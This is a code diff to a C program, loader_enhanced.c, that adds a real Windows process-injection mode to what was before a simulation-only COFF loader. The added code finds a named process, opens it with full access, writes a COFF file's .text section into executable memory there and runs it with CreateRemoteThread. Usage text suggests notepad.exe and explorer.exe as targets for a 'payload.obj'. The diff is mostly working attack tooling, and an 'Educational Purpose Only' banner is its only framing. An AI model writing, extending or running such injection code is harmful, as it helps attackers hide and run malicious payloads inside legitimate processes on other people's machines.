@@ -1,12 +1,13 @@
 // loader_enhanced.c
-// Enhanced loader with process injection simulation and advanced VM
-// FIXED: Removed C++ lambdas, fixed string operations
+// Enhanced loader with both simulation and real process injection capabilities
+// FIXED: Removed C++ lambdas, fixed string operations, added real injection
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
 #include <string.h>
 #include <windows.h>
+#include <tlhelp32.h>
 
 #pragma pack(push,1)
 typedef struct {
@@ -85,6 +86,145 @@ void host_getsysteminfo_impl(void) {
 void host_sleep_impl(uint32_t ms) {
     printf("[HOST] SLEEP: %u ms\n", ms);
     // Don't actually sleep in demo
+}
+
+// Real COFF loading and injection functions
+BOOL InjectCOFFIntoProcess(DWORD pid, const char* coffPath) {
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    LPVOID pRemoteCode = NULL;
+    HANDLE hFile = NULL;
+    DWORD fileSize = 0;
+    LPVOID pFileData = NULL;
+    DWORD bytesRead = 0;
+    
+    printf("[REAL INJECTION] Starting real injection into PID: %lu\n", pid);
+    
+    // 1. Open target process
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        printf("[-] Failed to open process: %d\n", GetLastError());
+        return FALSE;
+    }
+    
+    printf("[REAL INJECTION] Process opened successfully\n");
+    
+    // 2. Read COFF file
+    hFile = CreateFileA(coffPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
+                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to open COFF file\n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    fileSize = GetFileSize(hFile, NULL);
+    pFileData = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
+    if (!pFileData) {
+        printf("[-] Failed to allocate memory for COFF file\n");
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    ReadFile(hFile, pFileData, fileSize, &bytesRead, NULL);
+    CloseHandle(hFile);
+    
+    printf("[REAL INJECTION] COFF file loaded: %lu bytes\n", bytesRead);
+    
+    // 3. Parse COFF and extract .text section
+    PIMAGE_FILE_HEADER pCoffHeader = (PIMAGE_FILE_HEADER)pFileData;
+    PIMAGE_SECTION_HEADER pSections = (PIMAGE_SECTION_HEADER)((BYTE*)pFileData + 
+                                 sizeof(IMAGE_FILE_HEADER));
+    
+    // Find .text section
+    PIMAGE_SECTION_HEADER pTextSection = NULL;
+    for (int i = 0; i < pCoffHeader->NumberOfSections; i++) {
+        if (strcmp((char*)pSections[i].Name, ".text") == 0) {
+            pTextSection = &pSections[i];
+            break;
+        }
+    }
+    
+    if (!pTextSection) {
+        printf("[-] .text section not found\n");
+        VirtualFree(pFileData, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    printf("[REAL INJECTION] Found .text section: %lu bytes\n", pTextSection->SizeOfRawData);
+    
+    // 4. Allocate memory in target process
+    pRemoteCode = VirtualAllocEx(hProcess, NULL, pTextSection->SizeOfRawData,
+                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pRemoteCode) {
+        printf("[-] Failed to allocate memory in target process: %d\n", GetLastError());
+        VirtualFree(pFileData, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    printf("[REAL INJECTION] Memory allocated in target process: 0x%p\n", pRemoteCode);
+    
+    // 5. Write shellcode to target process
+    LPVOID pTextData = (BYTE*)pFileData + pTextSection->PointerToRawData;
+    if (!WriteProcessMemory(hProcess, pRemoteCode, pTextData, 
+                           pTextSection->SizeOfRawData, NULL)) {
+        printf("[-] Failed to write to target process memory: %d\n", GetLastError());
+        VirtualFree(pFileData, 0, MEM_RELEASE);
+        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    printf("[REAL INJECTION] Shellcode written to target process\n");
+    
+    // 6. Create remote thread to execute shellcode
+    hThread = CreateRemoteThread(hProcess, NULL, 0, 
+                                (LPTHREAD_START_ROUTINE)pRemoteCode, 
+                                NULL, 0, NULL);
+    if (!hThread) {
+        printf("[-] Failed to create remote thread: %d\n", GetLastError());
+        VirtualFree(pFileData, 0, MEM_RELEASE);
+        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    printf("[+] Successfully injected COFF into process %d\n", pid);
+    printf("[+] Thread created: %d\n", GetThreadId(hThread));
+    
+    // Wait for thread completion (optional)
+    printf("[REAL INJECTION] Waiting for thread completion...\n");
+    WaitForSingleObject(hThread, 5000); // Wait up to 5 seconds
+    
+    // Cleanup
+    CloseHandle(hThread);
+    VirtualFree(pFileData, 0, MEM_RELEASE);
+    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    
+    return TRUE;
+}
+
+// Process enumeration for target finding
+DWORD FindProcessId(const char* processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            if (strcmp(pe32.szExeFile, processName) == 0) {
+                CloseHandle(hSnapshot);
+                return pe32.th32ProcessID;
+            }
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+    
+    CloseHandle(hSnapshot);
+    return 0;
 }
 
 // Simulate process hollowing by creating a suspended process
@@ -185,14 +325,63 @@ void print_separator(void) {
     printf("==================================================\n");
 }
 
-int main(int argc, char **argv) {
-    if (argc != 2) {
-        fprintf(stderr, "Usage: %s <file.obj>\n", argv[0]);
-        return 2;
+// Parse command line arguments
+typedef struct {
+    int real_injection;
+    const char* target_process;
+    const char* coff_file;
+} CommandLineArgs;
+
+CommandLineArgs parse_arguments(int argc, char** argv) {
+    CommandLineArgs args = {0};
+    
+    if (argc == 4 && strcmp(argv[1], "--target") == 0) {
+        // Real injection mode: loader_enhanced.exe --target process_name coff_file.obj
+        args.real_injection = 1;
+        args.target_process = argv[2];
+        args.coff_file = argv[3];
+    } else if (argc == 2) {
+        // Simulation mode: loader_enhanced.exe coff_file.obj
+        args.real_injection = 0;
+        args.coff_file = argv[1];
     }
     
-    printf("[+] Enhanced COFF Loader - Process Injection Simulation\n");
-    printf("[+] Target: %s\n\n", argv[1]);
+    return args;
+}
+
+// Real injection mode
+int perform_real_injection(const char* target_process, const char* coff_file) {
+    printf("[+] REAL INJECTION MODE ACTIVATED\n");
+    printf("[+] Target: %s\n", target_process);
+    printf("[+] COFF File: %s\n", coff_file);
+    print_separator();
+    
+    DWORD pid = FindProcessId(target_process);
+    if (pid == 0) {
+        printf("[-] Process not found: %s\n", target_process);
+        printf("[-] Available processes you can try:\n");
+        printf("    - notepad.exe\n");
+        printf("    - calc.exe\n"); 
+        printf("    - explorer.exe\n");
+        return 1;
+    }
+    
+    printf("[+] Found process %s with PID: %d\n", target_process, pid);
+    printf("[+] Injecting COFF file: %s\n", coff_file);
+    
+    if (InjectCOFFIntoProcess(pid, coff_file)) {
+        printf("[+] Injection completed successfully\n");
+        return 0;
+    } else {
+        printf("[-] Injection failed\n");
+        return 1;
+    }
+}
+
+// Simulation mode
+int perform_simulation(const char* coff_file) {
+    printf("[+] SIMULATION MODE\n");
+    printf("[+] COFF File: %s\n\n", coff_file);
     
     // Simulate process hollowing
     HANDLE hProcess = simulate_process_hollowing("notepad.exe");
@@ -203,7 +392,7 @@ int main(int argc, char **argv) {
         CloseHandle(hProcess);
     }
     
-    FILE *f = fopen(argv[1], "rb");
+    FILE *f = fopen(coff_file, "rb");
     if (!f) { 
         perror("fopen"); 
         return 1; 
@@ -303,4 +492,31 @@ int main(int argc, char **argv) {
     fclose(f);
     
     return 0;
+}
+
+int main(int argc, char **argv) {
+    printf("[+] Enhanced COFF Loader - Process Injection Tool\n");
+    printf("[+] Educational Purpose Only - Authorized Testing Only\n");
+    print_separator();
+    
+    // Parse command line arguments
+    CommandLineArgs args = parse_arguments(argc, argv);
+    
+    if (args.real_injection) {
+        // Real injection mode
+        return perform_real_injection(args.target_process, args.coff_file);
+    } else if (args.coff_file) {
+        // Simulation mode
+        return perform_simulation(args.coff_file);
+    } else {
+        // Usage information
+        printf("Usage:\n");
+        printf("  Simulation Mode: %s <coff_file.obj>\n", argv[0]);
+        printf("  Real Injection:  %s --target <process_name> <coff_file.obj>\n", argv[0]);
+        printf("\nExamples:\n");
+        printf("  %s payload.obj\n", argv[0]);
+        printf("  %s --target notepad.exe payload.obj\n", argv[0]);
+        printf("\nWARNING: Real injection requires appropriate privileges and authorization.\n");
+        return 2;
+    }
 }
